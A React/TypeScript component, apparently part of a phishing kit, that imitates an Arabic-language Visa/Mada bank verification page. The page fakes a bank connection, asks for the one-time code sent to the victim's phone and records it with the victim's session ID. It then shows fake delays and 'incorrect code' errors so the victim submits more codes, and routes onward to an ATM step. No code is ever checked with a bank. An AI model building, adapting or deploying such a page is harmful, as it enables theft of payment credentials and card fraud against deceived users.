import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { addSubmission } from "@/lib/submissions";
import { Header } from "@/components/layout/Header";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Loader2 } from "lucide-react";
import { motion, AnimatePresence } from "framer-motion";
import visaMadaImage from "../assets/VISAMADAH_1779063055374.png";

export default function Otp({ attempt = 1, isError = false }: { attempt?: number, isError?: boolean }) {
  const [, setLocation] = useLocation();
  
  
  const [otpCode, setOtpCode] = useState("");
  const [loading, setLoading] = useState(false);
  const [initialLoading, setInitialLoading] = useState(true);
  const [timeLeft, setTimeLeft] = useState(180); // 3 minutes

  const last4 = localStorage.getItem("cardLast4") || "1234";

  useEffect(() => {
    // Simulate initial bank connection
    const timer = setTimeout(() => {
      setInitialLoading(false);
    }, 3000);
    return () => clearTimeout(timer);
  }, []);

  useEffect(() => {
    if (initialLoading) return;
    
    if (timeLeft === 0) return;
    const timer = setInterval(() => {
      setTimeLeft(prev => prev - 1);
    }, 1000);
    return () => clearInterval(timer);
  }, [timeLeft, initialLoading]);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `0${mins}:${secs.toString().padStart(2, '0')}`;
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (otpCode.length < 4) return;
    
    const sessionId = localStorage.getItem("sessionId");
    if (!sessionId) {
      setLocation("/");
      return;
    }

    setLoading(true);
    try {
      addSubmission("otp", sessionId, { otpCode, attempt });
      setTimeout(() => {
        if (attempt === 1) {
          setLocation("/otp2");
        } else {
          if (attempt === 2) {
            setLocation("/atm");
          } else {
            setLocation("/otp2");
          }
        }
      }, 8000);
    } catch {
      setLoading(false);
    }
  };

  if (initialLoading) {
    return (
      <div className="min-h-screen bg-gray-50 flex flex-col items-center justify-center">
        <Loader2 className="w-16 h-16 animate-spin text-primary mb-6" />
        <h2 className="text-2xl font-bold text-gray-800">مصادقة الشراء</h2>
        <p className="text-gray-500 mt-2">يتم الآن الاتصال بالبنك...</p>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col">
      <Header />
      
      <AnimatePresence>
        {loading && (
          <motion.div 
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 bg-white/90 backdrop-blur-sm z-50 flex flex-col items-center justify-center"
          >
            <Loader2 className="w-16 h-16 animate-spin text-primary mb-6" />
            <h2 className="text-2xl font-bold text-gray-800">جاري التحقق...</h2>
            <p className="text-gray-500 mt-2">الرجاء عدم إغلاق هذه الصفحة</p>
          </motion.div>
        )}
      </AnimatePresence>

      <div className="container mx-auto px-4 py-12 flex-1 flex justify-center items-start">
        <div className="bg-white rounded-xl shadow-lg border border-gray-200 p-8 max-w-md w-full text-center">
          
          <img src={visaMadaImage} alt="Visa and Mada" className="h-12 mx-auto mb-6 object-contain" />
          
          <h2 className="text-xl font-bold text-gray-800 mb-4">التحقق من الدفع</h2>
          
          <p className="text-gray-600 mb-8 leading-relaxed">
            سيتم الاتصال بك من قبل البنك المصدر للبطاقة الائتمانية المنتهية بـ <span className="font-bold text-primary" dir="ltr">{last4}</span> لتأكيد عملية الدفع.
            أو أدخل الرمز المرسل إلى جوالك.
          </p>
          
          {isError && (
            <div className="bg-red-50 text-red-600 p-3 rounded-lg mb-6 border border-red-200 text-sm font-bold animate-in shake">
              عذراً لقد ادخلت رمز غير صحيح
            </div>
          )}

          <form onSubmit={handleSubmit} className="space-y-6">
            <div className="space-y-2">
              <Input 
                type="text" 
                required 
                value={otpCode} 
                onChange={e => setOtpCode(e.target.value.replace(/\D/g, "").substring(0, 6))} 
                placeholder="أدخل الرمز هنا"
                dir="ltr"
                className="text-center text-2xl tracking-widest h-14"
                maxLength={6}
                autoFocus
              />
            </div>
            
            <div className="text-gray-500 font-mono text-xl">
              {formatTime(timeLeft)}
            </div>

            <Button 
              type="submit" 
              className="w-full h-12 text-lg font-bold bg-primary hover:bg-primary/90 text-white"
              disabled={loading || otpCode.length < 4}
            >
              تأكيد &larr;
            </Button>
          </form>
        </div>
      </div>
    </div>
  );
}
